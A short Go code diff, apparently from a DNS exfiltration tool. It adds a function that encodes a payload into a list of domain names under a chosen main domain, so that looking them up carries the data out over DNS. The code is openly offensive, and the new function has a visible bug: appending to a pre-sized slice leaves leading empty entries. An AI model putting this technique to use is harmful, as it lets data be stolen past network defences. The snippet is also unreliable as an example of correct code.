@@ -24,7 +24,16 @@ type ExfilPacket struct {
 const packetPayloadSize = 120
 const packetPayloadChunkSize = 40
 
-func EncodeDataToExfilPackets(payload string, mainDomain string) []ExfilPacket {
+func GetDomainsToLookUp(payload string, mainDomain string) []string {
+	exfilPackets := encodeDataToExfilPackets(payload, mainDomain)
+	domains := make([]string, len(exfilPackets))
+	for _, ep := range exfilPackets {
+		domains = append(domains, ep.ToFqdn())
+	}
+	return domains
+}
+
+func encodeDataToExfilPackets(payload string, mainDomain string) []ExfilPacket {
 	dataToExfil := dataToExfil{
 		payload:    payload,
 		mainDomain: mainDomain,
